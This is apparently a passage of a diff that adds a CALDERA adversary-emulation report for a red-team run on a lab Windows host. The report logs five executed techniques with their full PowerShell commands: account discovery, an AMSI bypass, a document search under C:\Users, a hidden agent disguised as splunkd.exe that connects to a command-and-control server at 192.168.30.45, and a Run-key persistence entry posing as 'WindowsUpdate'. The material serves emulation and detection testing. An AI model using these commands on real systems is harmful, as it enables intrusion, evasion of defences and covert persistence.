+        &quot;ts&quot;: &quot;2026-04-02T08:15:40Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:43Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:46Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:49Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:52Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:54Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:15:57Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:00Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:03Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:05Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:27Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:30Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      },
+      {
+        &quot;ts&quot;: &quot;2026-04-02T08:16:33Z&quot;,
+        &quot;state&quot;: &quot;finished&quot;,
+        &quot;links&quot;: 5,
+        &quot;potential_links&quot;: 0,
+        &quot;event_logs&quot;: 0
+      }
+    ],
+    &quot;last_poll_utc&quot;: &quot;2026-04-02T08:16:32Z&quot;,
+    &quot;links&quot;: [
+      {
+        &quot;id&quot;: &quot;1819c5bc-8eca-48a6-9eef-fbecb36df769&quot;,
+        &quot;paw&quot;: &quot;fgdafj&quot;,
+        &quot;command&quot;: &quot;whoamiwhoami /privnet usernet localgroup administrators&quot;,
+        &quot;plaintext_command&quot;: &quot;whoamiwhoami /privnet usernet localgroup administrators&quot;,
+        &quot;status&quot;: 1,
+        &quot;score&quot;: 0,
+        &quot;decide&quot;: &quot;2026-04-02T08:06:33Z&quot;,
+        &quot;pin&quot;: 0,
+        &quot;pid&quot;: &quot;6104&quot;,
+        &quot;facts&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;used&quot;: [],
+        &quot;unique&quot;: &quot;1819c5bc-8eca-48a6-9eef-fbecb36df769&quot;,
+        &quot;collect&quot;: &quot;2026-04-02T08:06:39Z&quot;,
+        &quot;finish&quot;: &quot;2026-04-02T08:06:39Z&quot;,
+        &quot;ability&quot;: {
+          &quot;ability_id&quot;: &quot;discovery_users&quot;,
+          &quot;tactic&quot;: &quot;discovery&quot;,
+          &quot;technique_name&quot;: &quot;System Owner/User Discovery&quot;,
+          &quot;technique_id&quot;: &quot;T1033&quot;,
+          &quot;name&quot;: &quot;User Discovery&quot;,
+          &quot;description&quot;: &quot;Enumerate current identity, privileges, and administrators.&quot;,
+          &quot;executors&quot;: [
+            {
+              &quot;name&quot;: &quot;psh&quot;,
+              &quot;platform&quot;: &quot;windows&quot;,
+              &quot;command&quot;: &quot;whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n&quot;,
+              &quot;code&quot;: null,
+              &quot;language&quot;: null,
+              &quot;build_target&quot;: null,
+              &quot;payloads&quot;: [],
+              &quot;uploads&quot;: [],
+              &quot;timeout&quot;: 60,
+              &quot;parsers&quot;: [],
+              &quot;cleanup&quot;: [],
+              &quot;variations&quot;: [],
+              &quot;additional_info&quot;: {}
+            }
+          ],
+          &quot;requirements&quot;: [],
+          &quot;privilege&quot;: null,
+          &quot;repeatable&quot;: false,
+          &quot;buckets&quot;: [
+            &quot;discovery&quot;
+          ],
+          &quot;additional_info&quot;: {},
+          &quot;access&quot;: {},
+          &quot;singleton&quot;: false,
+          &quot;plugin&quot;: &quot;&quot;,
+          &quot;delete_payload&quot;: true
+        },
+        &quot;executor&quot;: {
+          &quot;name&quot;: &quot;psh&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;command&quot;: &quot;whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n&quot;,
+          &quot;code&quot;: null,
+          &quot;language&quot;: null,
+          &quot;build_target&quot;: null,
+          &quot;payloads&quot;: [],
+          &quot;uploads&quot;: [],
+          &quot;timeout&quot;: 60,
+          &quot;parsers&quot;: [],
+          &quot;cleanup&quot;: [],
+          &quot;variations&quot;: [],
+          &quot;additional_info&quot;: {}
+        },
+        &quot;cleanup&quot;: 0,
+        &quot;visibility&quot;: {
+          &quot;score&quot;: 50,
+          &quot;adjustments&quot;: []
+        },
+        &quot;host&quot;: &quot;WS10&quot;,
+        &quot;output&quot;: &quot;True&quot;,
+        &quot;deadman&quot;: false,
+        &quot;agent_reported_time&quot;: &quot;2026-04-02T08:06:39Z&quot;
+      },
+      {
+        &quot;id&quot;: &quot;420809c8-7777-4c24-bef8-677da2b7d67a&quot;,
+        &quot;paw&quot;: &quot;fgdafj&quot;,
+        &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);$f.SetValue($null,$true)&quot;,
+        &quot;plaintext_command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);$f.SetValue($null,$true)&quot;,
+        &quot;status&quot;: 0,
+        &quot;score&quot;: 0,
+        &quot;decide&quot;: &quot;2026-04-02T08:06:44Z&quot;,
+        &quot;pin&quot;: 0,
+        &quot;pid&quot;: &quot;6684&quot;,
+        &quot;facts&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;used&quot;: [],
+        &quot;unique&quot;: &quot;420809c8-7777-4c24-bef8-677da2b7d67a&quot;,
+        &quot;collect&quot;: &quot;2026-04-02T08:07:31Z&quot;,
+        &quot;finish&quot;: &quot;2026-04-02T08:07:31Z&quot;,
+        &quot;ability&quot;: {
+          &quot;ability_id&quot;: &quot;amsi_bypass&quot;,
+          &quot;tactic&quot;: &quot;defense-evasion&quot;,
+          &quot;technique_name&quot;: &quot;Impair Defenses&quot;,
+          &quot;technique_id&quot;: &quot;T1562.001&quot;,
+          &quot;name&quot;: &quot;AMSI Bypass&quot;,
+          &quot;description&quot;: &quot;Disable AMSI for the current PowerShell runspace.&quot;,
+          &quot;executors&quot;: [
+            {
+              &quot;name&quot;: &quot;psh&quot;,
+              &quot;platform&quot;: &quot;windows&quot;,
+              &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);\n$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);\n$f.SetValue($null,$true)\n&quot;,
+              &quot;code&quot;: null,
+              &quot;language&quot;: null,
+              &quot;build_target&quot;: null,
+              &quot;payloads&quot;: [],
+              &quot;uploads&quot;: [],
+              &quot;timeout&quot;: 60,
+              &quot;parsers&quot;: [],
+              &quot;cleanup&quot;: [],
+              &quot;variations&quot;: [],
+              &quot;additional_info&quot;: {}
+            }
+          ],
+          &quot;requirements&quot;: [],
+          &quot;privilege&quot;: null,
+          &quot;repeatable&quot;: false,
+          &quot;buckets&quot;: [
+            &quot;defense-evasion&quot;
+          ],
+          &quot;additional_info&quot;: {},
+          &quot;access&quot;: {},
+          &quot;singleton&quot;: false,
+          &quot;plugin&quot;: &quot;&quot;,
+          &quot;delete_payload&quot;: true
+        },
+        &quot;executor&quot;: {
+          &quot;name&quot;: &quot;psh&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);\n$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);\n$f.SetValue($null,$true)\n&quot;,
+          &quot;code&quot;: null,
+          &quot;language&quot;: null,
+          &quot;build_target&quot;: null,
+          &quot;payloads&quot;: [],
+          &quot;uploads&quot;: [],
+          &quot;timeout&quot;: 60,
+          &quot;parsers&quot;: [],
+          &quot;cleanup&quot;: [],
+          &quot;variations&quot;: [],
+          &quot;additional_info&quot;: {}
+        },
+        &quot;cleanup&quot;: 0,
+        &quot;visibility&quot;: {
+          &quot;score&quot;: 50,
+          &quot;adjustments&quot;: []
+        },
+        &quot;host&quot;: &quot;WS10&quot;,
+        &quot;output&quot;: &quot;False&quot;,
+        &quot;deadman&quot;: false,
+        &quot;agent_reported_time&quot;: &quot;2026-04-02T08:07:31Z&quot;
+      },
+      {
+        &quot;id&quot;: &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;,
+        &quot;paw&quot;: &quot;fgdafj&quot;,
+        &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}&quot;,
+        &quot;plaintext_command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}&quot;,
+        &quot;status&quot;: 0,
+        &quot;score&quot;: 0,
+        &quot;decide&quot;: &quot;2026-04-02T08:07:32Z&quot;,
+        &quot;pin&quot;: 0,
+        &quot;pid&quot;: &quot;4316&quot;,
+        &quot;facts&quot;: [
+          {
+            &quot;unique&quot;: &quot;host.file.pathC:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt&quot;,
+            &quot;trait&quot;: &quot;host.file.path&quot;,
+            &quot;name&quot;: &quot;host.file.path&quot;,
+            &quot;value&quot;: &quot;C:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+            &quot;origin_type&quot;: &quot;LEARNED&quot;,
+            &quot;links&quot;: [
+              &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;
+            ],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [
+              &quot;fgdafj&quot;
+            ],
+            &quot;technique_id&quot;: &quot;T1005&quot;
+          },
+          {
+            &quot;unique&quot;: &quot;host.file.pathC:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt&quot;,
+            &quot;trait&quot;: &quot;host.file.path&quot;,
+            &quot;name&quot;: &quot;host.file.path&quot;,
+            &quot;value&quot;: &quot;C:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt&quot;,
+            &quot;created&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+            &quot;score&quot;: 1,
+            &quot;source&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+            &quot;origin_type&quot;: &quot;LEARNED&quot;,
+            &quot;links&quot;: [
+              &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;
+            ],
+            &quot;relationships&quot;: [],
+            &quot;limit_count&quot;: -1,
+            &quot;collected_by&quot;: [
+              &quot;fgdafj&quot;
+            ],
+            &quot;technique_id&quot;: &quot;T1005&quot;
+          }
+        ],
+        &quot;relationships&quot;: [],
+        &quot;used&quot;: [],
+        &quot;unique&quot;: &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;,
+        &quot;collect&quot;: &quot;2026-04-02T08:08:12Z&quot;,
+        &quot;finish&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+        &quot;ability&quot;: {
+          &quot;ability_id&quot;: &quot;collection_files&quot;,
+          &quot;tactic&quot;: &quot;collection&quot;,
+          &quot;technique_name&quot;: &quot;Data from Local System&quot;,
+          &quot;technique_id&quot;: &quot;T1005&quot;,
+          &quot;name&quot;: &quot;Sensitive File Discovery&quot;,
+          &quot;description&quot;: &quot;Search for common document types under C:\\Users.&quot;,
+          &quot;executors&quot;: [
+            {
+              &quot;name&quot;: &quot;psh&quot;,
+              &quot;platform&quot;: &quot;windows&quot;,
+              &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n&quot;,
+              &quot;code&quot;: null,
+              &quot;language&quot;: null,
+              &quot;build_target&quot;: null,
+              &quot;payloads&quot;: [],
+              &quot;uploads&quot;: [],
+              &quot;timeout&quot;: 120,
+              &quot;parsers&quot;: [],
+              &quot;cleanup&quot;: [],
+              &quot;variations&quot;: [],
+              &quot;additional_info&quot;: {}
+            }
+          ],
+          &quot;requirements&quot;: [],
+          &quot;privilege&quot;: null,
+          &quot;repeatable&quot;: false,
+          &quot;buckets&quot;: [
+            &quot;collection&quot;
+          ],
+          &quot;additional_info&quot;: {},
+          &quot;access&quot;: {},
+          &quot;singleton&quot;: false,
+          &quot;plugin&quot;: &quot;&quot;,
+          &quot;delete_payload&quot;: true
+        },
+        &quot;executor&quot;: {
+          &quot;name&quot;: &quot;psh&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n&quot;,
+          &quot;code&quot;: null,
+          &quot;language&quot;: null,
+          &quot;build_target&quot;: null,
+          &quot;payloads&quot;: [],
+          &quot;uploads&quot;: [],
+          &quot;timeout&quot;: 120,
+          &quot;parsers&quot;: [],
+          &quot;cleanup&quot;: [],
+          &quot;variations&quot;: [],
+          &quot;additional_info&quot;: {}
+        },
+        &quot;cleanup&quot;: 0,
+        &quot;visibility&quot;: {
+          &quot;score&quot;: 50,
+          &quot;adjustments&quot;: []
+        },
+        &quot;host&quot;: &quot;WS10&quot;,
+        &quot;output&quot;: &quot;True&quot;,
+        &quot;deadman&quot;: false,
+        &quot;agent_reported_time&quot;: &quot;2026-04-02T08:08:12Z&quot;
+      },
+      {
+        &quot;id&quot;: &quot;77d32750-a1de-4499-85e5-8b77bdbd14e3&quot;,
+        &quot;paw&quot;: &quot;fgdafj&quot;,
+        &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `-WindowStyle Hidden&quot;,
+        &quot;plaintext_command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `-WindowStyle Hidden&quot;,
+        &quot;status&quot;: 1,
+        &quot;score&quot;: 0,
+        &quot;decide&quot;: &quot;2026-04-02T08:08:14Z&quot;,
+        &quot;pin&quot;: 0,
+        &quot;pid&quot;: &quot;9808&quot;,
+        &quot;facts&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;used&quot;: [],
+        &quot;unique&quot;: &quot;77d32750-a1de-4499-85e5-8b77bdbd14e3&quot;,
+        &quot;collect&quot;: &quot;2026-04-02T08:09:01Z&quot;,
+        &quot;finish&quot;: &quot;2026-04-02T08:09:01Z&quot;,
+        &quot;ability&quot;: {
+          &quot;ability_id&quot;: &quot;c2_internal&quot;,
+          &quot;tactic&quot;: &quot;command-and-control&quot;,
+          &quot;technique_name&quot;: &quot;Application Layer Protocol&quot;,
+          &quot;technique_id&quot;: &quot;T1071.001&quot;,
+          &quot;name&quot;: &quot;Internal C2&quot;,
+          &quot;description&quot;: &quot;Start an agent process against the internal CALDERA HTTP listener.&quot;,
+          &quot;executors&quot;: [
+            {
+              &quot;name&quot;: &quot;psh&quot;,
+              &quot;platform&quot;: &quot;windows&quot;,
+              &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `\n-WindowStyle Hidden\n&quot;,
+              &quot;code&quot;: null,
+              &quot;language&quot;: null,
+              &quot;build_target&quot;: null,
+              &quot;payloads&quot;: [],
+              &quot;uploads&quot;: [],
+              &quot;timeout&quot;: 60,
+              &quot;parsers&quot;: [],
+              &quot;cleanup&quot;: [],
+              &quot;variations&quot;: [],
+              &quot;additional_info&quot;: {}
+            }
+          ],
+          &quot;requirements&quot;: [],
+          &quot;privilege&quot;: null,
+          &quot;repeatable&quot;: false,
+          &quot;buckets&quot;: [
+            &quot;command-and-control&quot;
+          ],
+          &quot;additional_info&quot;: {},
+          &quot;access&quot;: {},
+          &quot;singleton&quot;: false,
+          &quot;plugin&quot;: &quot;&quot;,
+          &quot;delete_payload&quot;: true
+        },
+        &quot;executor&quot;: {
+          &quot;name&quot;: &quot;psh&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `\n-WindowStyle Hidden\n&quot;,
+          &quot;code&quot;: null,
+          &quot;language&quot;: null,
+          &quot;build_target&quot;: null,
+          &quot;payloads&quot;: [],
+          &quot;uploads&quot;: [],
+          &quot;timeout&quot;: 60,
+          &quot;parsers&quot;: [],
+          &quot;cleanup&quot;: [],
+          &quot;variations&quot;: [],
+          &quot;additional_info&quot;: {}
+        },
+        &quot;cleanup&quot;: 0,
+        &quot;visibility&quot;: {
+          &quot;score&quot;: 50,
+          &quot;adjustments&quot;: []
+        },
+        &quot;host&quot;: &quot;WS10&quot;,
+        &quot;output&quot;: &quot;True&quot;,
+        &quot;deadman&quot;: false,
+        &quot;agent_reported_time&quot;: &quot;2026-04-02T08:09:00Z&quot;
+      },
+      {
+        &quot;id&quot;: &quot;4d6ab1d9-1447-493f-b276-eead40153cbb&quot;,
+        &quot;paw&quot;: &quot;fgdafj&quot;,
+        &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `-Name \&quot;WindowsUpdate\&quot; `-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force&quot;,
+        &quot;plaintext_command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `-Name \&quot;WindowsUpdate\&quot; `-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force&quot;,
+        &quot;status&quot;: 1,
+        &quot;score&quot;: 0,
+        &quot;decide&quot;: &quot;2026-04-02T08:09:02Z&quot;,
+        &quot;pin&quot;: 0,
+        &quot;pid&quot;: &quot;5168&quot;,
+        &quot;facts&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;used&quot;: [],
+        &quot;unique&quot;: &quot;4d6ab1d9-1447-493f-b276-eead40153cbb&quot;,
+        &quot;collect&quot;: &quot;2026-04-02T08:09:49Z&quot;,
+        &quot;finish&quot;: &quot;2026-04-02T08:09:49Z&quot;,
+        &quot;ability&quot;: {
+          &quot;ability_id&quot;: &quot;persistence_registry&quot;,
+          &quot;tactic&quot;: &quot;persistence&quot;,
+          &quot;technique_name&quot;: &quot;Registry Run Keys / Startup Folder&quot;,
+          &quot;technique_id&quot;: &quot;T1547.001&quot;,
+          &quot;name&quot;: &quot;Registry Persistence&quot;,
+          &quot;description&quot;: &quot;Create a Run key for persistence.&quot;,
+          &quot;executors&quot;: [
+            {
+              &quot;name&quot;: &quot;psh&quot;,
+              &quot;platform&quot;: &quot;windows&quot;,
+              &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `\n-Name \&quot;WindowsUpdate\&quot; `\n-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force\n&quot;,
+              &quot;code&quot;: null,
+              &quot;language&quot;: null,
+              &quot;build_target&quot;: null,
+              &quot;payloads&quot;: [],
+              &quot;uploads&quot;: [],
+              &quot;timeout&quot;: 60,
+              &quot;parsers&quot;: [],
+              &quot;cleanup&quot;: [],
+              &quot;variations&quot;: [],
+              &quot;additional_info&quot;: {}
+            }
+          ],
+          &quot;requirements&quot;: [],
+          &quot;privilege&quot;: null,
+          &quot;repeatable&quot;: false,
+          &quot;buckets&quot;: [
+            &quot;persistence&quot;
+          ],
+          &quot;additional_info&quot;: {},
+          &quot;access&quot;: {},
+          &quot;singleton&quot;: false,
+          &quot;plugin&quot;: &quot;&quot;,
+          &quot;delete_payload&quot;: true
+        },
+        &quot;executor&quot;: {
+          &quot;name&quot;: &quot;psh&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `\n-Name \&quot;WindowsUpdate\&quot; `\n-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force\n&quot;,
+          &quot;code&quot;: null,
+          &quot;language&quot;: null,
+          &quot;build_target&quot;: null,
+          &quot;payloads&quot;: [],
+          &quot;uploads&quot;: [],
+          &quot;timeout&quot;: 60,
+          &quot;parsers&quot;: [],
+          &quot;cleanup&quot;: [],
+          &quot;variations&quot;: [],
+          &quot;additional_info&quot;: {}
+        },
+        &quot;cleanup&quot;: 0,
+        &quot;visibility&quot;: {
+          &quot;score&quot;: 50,
+          &quot;adjustments&quot;: []
+        },
+        &quot;host&quot;: &quot;WS10&quot;,
+        &quot;output&quot;: &quot;True&quot;,
+        &quot;deadman&quot;: false,
+        &quot;agent_reported_time&quot;: &quot;2026-04-02T08:09:48Z&quot;
+      }
+    ],
+    &quot;potential_links&quot;: [],
+    &quot;event_logs&quot;: [],
+    &quot;poll_error&quot;: &quot;HTTPConnectionPool(host=&#x27;192.168.30.45&#x27;, port=8888): Max retries exceeded with url: /api/rest (Caused by NewConnectionError(\&quot;HTTPConnection(host=&#x27;192.168.30.45&#x27;, port=8888): Failed to establish a new connection: [WinError 10061] Impossibile stabilire la connessione. Rifiuto persistente del computer di destinazione\&quot;))&quot;,
+    &quot;diagnostics&quot;: {
+      &quot;api_mode&quot;: &quot;v2&quot;,
+      &quot;operation_id&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+      &quot;operation_name&quot;: &quot;apt-sim-20260402-100632&quot;,
+      &quot;operation_state&quot;: &quot;finished&quot;,
+      &quot;selected_agent_paw&quot;: &quot;fgdafj&quot;,
+      &quot;selected_group&quot;: &quot;red&quot;,
+      &quot;host_group_count&quot;: 1,
+      &quot;compatible_count&quot;: 5,
+      &quot;referenced_ability_count&quot;: 5,
+      &quot;links_total&quot;: 5,
+      &quot;links_relevant_to_selected_agent&quot;: 5,
+      &quot;potential_links_total&quot;: 0,
+      &quot;event_logs_total&quot;: 0,
+      &quot;report_present&quot;: false,
+      &quot;link_status_counts&quot;: {
+        &quot;1&quot;: 3,
+        &quot;0&quot;: 2
+      },
+      &quot;errors&quot;: {
+        &quot;poll_error&quot;: &quot;HTTPConnectionPool(host=&#x27;192.168.30.45&#x27;, port=8888): Max retries exceeded with url: /api/rest (Caused by NewConnectionError(\&quot;HTTPConnection(host=&#x27;192.168.30.45&#x27;, port=8888): Failed to establish a new connection: [WinError 10061] Impossibile stabilire la connessione. Rifiuto persistente del computer di destinazione\&quot;))&quot;
+      },
+      &quot;probable_causes&quot;: [
+        &quot;Operation in stato finished, non propriamente in esecuzione.&quot;
+      ]
+    }
+  }
+}</pre>
+<h2>Compatibility Check</h2><pre>{
+  &quot;agent_paw&quot;: &quot;fgdafj&quot;,
+  &quot;agent_host&quot;: &quot;WS10&quot;,
+  &quot;agent_platform&quot;: &quot;windows&quot;,
+  &quot;agent_executors&quot;: [
+    &quot;psh&quot;,
+    &quot;proc&quot;,
+    &quot;cmd&quot;
+  ],
+  &quot;adversary_id&quot;: &quot;temp-seed-fgdafj-1775117192&quot;,
+  &quot;adversary_name&quot;: &quot;Temp Seed Windows - gruppo1&quot;,
+  &quot;referenced_ability_count&quot;: 5,
+  &quot;compatible_count&quot;: 5,
+  &quot;incompatible_count&quot;: 0,
+  &quot;missing_count&quot;: 0,
+  &quot;fixed_embedded_count&quot;: 0,
+  &quot;compatible&quot;: [
+    {
+      &quot;ability_id&quot;: &quot;discovery_users&quot;,
+      &quot;name&quot;: &quot;User Discovery&quot;,
+      &quot;tactic&quot;: &quot;discovery&quot;,
+      &quot;technique_id&quot;: &quot;T1033&quot;,
+      &quot;resolution&quot;: &quot;live&quot;,
+      &quot;reason&quot;: &quot;compatible&quot;,
+      &quot;noisy_score&quot;: 7,
+      &quot;windows_command&quot;: &quot;whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n&quot;,
+      &quot;has_requirements&quot;: false,
+      &quot;unresolved_placeholders&quot;: [],
+      &quot;seed_ready&quot;: true,
+      &quot;seed_reason&quot;: &quot;seed-ready&quot;
+    },
+    {
+      &quot;ability_id&quot;: &quot;amsi_bypass&quot;,
+      &quot;name&quot;: &quot;AMSI Bypass&quot;,
+      &quot;tactic&quot;: &quot;defense-evasion&quot;,
+      &quot;technique_id&quot;: &quot;T1562.001&quot;,
+      &quot;resolution&quot;: &quot;live&quot;,
+      &quot;reason&quot;: &quot;compatible&quot;,
+      &quot;noisy_score&quot;: 1,
+      &quot;windows_command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);\n$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);\n$f.SetValue($null,$true)\n&quot;,
+      &quot;has_requirements&quot;: false,
+      &quot;unresolved_placeholders&quot;: [],
+      &quot;seed_ready&quot;: true,
+      &quot;seed_reason&quot;: &quot;seed-ready&quot;
+    },
+    {
+      &quot;ability_id&quot;: &quot;collection_files&quot;,
+      &quot;name&quot;: &quot;Sensitive File Discovery&quot;,
+      &quot;tactic&quot;: &quot;collection&quot;,
+      &quot;technique_id&quot;: &quot;T1005&quot;,
+      &quot;resolution&quot;: &quot;live&quot;,
+      &quot;reason&quot;: &quot;compatible&quot;,
+      &quot;noisy_score&quot;: 1,
+      &quot;windows_command&quot;: &quot;Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n&quot;,
+      &quot;has_requirements&quot;: false,
+      &quot;unresolved_placeholders&quot;: [],
+      &quot;seed_ready&quot;: true,
+      &quot;seed_reason&quot;: &quot;seed-ready&quot;
+    },
+    {
+      &quot;ability_id&quot;: &quot;c2_internal&quot;,
+      &quot;name&quot;: &quot;Internal C2&quot;,
+      &quot;tactic&quot;: &quot;command-and-control&quot;,
+      &quot;technique_id&quot;: &quot;T1071.001&quot;,
+      &quot;resolution&quot;: &quot;live&quot;,
+      &quot;reason&quot;: &quot;compatible&quot;,
+      &quot;noisy_score&quot;: 0,
+      &quot;windows_command&quot;: &quot;Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \&quot;-server http://192.168.30.45:8888 -group red\&quot; `\n-WindowStyle Hidden\n&quot;,
+      &quot;has_requirements&quot;: false,
+      &quot;unresolved_placeholders&quot;: [],
+      &quot;seed_ready&quot;: true,
+      &quot;seed_reason&quot;: &quot;seed-ready&quot;
+    },
+    {
+      &quot;ability_id&quot;: &quot;persistence_registry&quot;,
+      &quot;name&quot;: &quot;Registry Persistence&quot;,
+      &quot;tactic&quot;: &quot;persistence&quot;,
+      &quot;technique_id&quot;: &quot;T1547.001&quot;,
+      &quot;resolution&quot;: &quot;live&quot;,
+      &quot;reason&quot;: &quot;compatible&quot;,
+      &quot;noisy_score&quot;: 0,
+      &quot;windows_command&quot;: &quot;New-ItemProperty -Path \&quot;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\&quot; `\n-Name \&quot;WindowsUpdate\&quot; `\n-Value \&quot;C:\\Users\\Public\\splunkd.exe\&quot; -Force\n&quot;,
+      &quot;has_requirements&quot;: false,
+      &quot;unresolved_placeholders&quot;: [],
